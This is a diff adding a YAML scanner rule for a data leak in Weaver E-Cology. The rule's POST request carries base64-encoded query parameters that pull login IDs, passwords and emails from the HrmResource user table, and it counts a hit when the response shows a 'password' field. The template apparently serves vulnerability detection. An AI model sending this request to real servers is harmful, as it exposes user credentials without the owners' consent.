@@ -1,0 +1,17 @@
+name: 泛微E-Cology-datas-信息泄露
+description: >
+  泄露敏感信息
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /api/ec/dev/search/datas
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: >-
+      type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
+    expression:
+      status: 200
+      body_all:
+        - "datas"
+        - "password"
